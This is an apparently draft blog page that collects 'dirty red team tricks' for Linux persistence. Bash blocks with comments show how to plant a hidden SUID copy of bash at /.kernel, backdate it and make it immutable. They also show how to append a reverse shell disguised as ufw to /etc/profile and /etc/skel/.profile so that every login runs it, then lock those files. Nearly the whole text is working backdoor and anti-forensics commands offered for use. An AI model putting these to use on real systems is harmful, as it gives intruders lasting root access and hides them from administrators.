+++
title = "Attack/Defense Tricks"
description= "Compilation of Dirty RedTeam Tricks"
language = "cyber"
date = 2025-09-05T11:14:36-04:00
draft = true
+++


### Root Shell Tricks


{{< highlight bash "linenos=inline" >}}
# Create a copy of Bash as `.kernel` — could be used for stealth or persistence
cp /bin/bash /.kernel

# Set the SUID bit on `.kernel` — allows execution with root privileges by any user
chmod +s /.kernel

# Backdate `.kernel` to May 4, 2004 — could help evade detection or appear benign
touch -d "2004-05-04 00:00:00" /.kernel

# Mark `.kernel` as immutable — prevents deletion, renaming, or modifications, even by root
chattr +i /.kernel

{{< /highlight >}}


### Backdoor New Users

{{< highlight bash "linenos=inline" >}}
# Append a reverse shell (disguised as ufw) to global login profile
echo "/usr/bin/ufw &" >> /etc/profile

# Ensure the backdoor also applies to any newly created users
echo "/usr/bin/ufw &" >> /etc/skel/.profile

# Set SUID bit so ufw executes with root privileges
chmod +s /usr/bin/ufw

# Make backdoor and modified profiles immutable (hard to remove, even by root)
chattr +i /usr/bin/ufw /etc/profile /etc/skel/.profile
{{< /highlight >}}



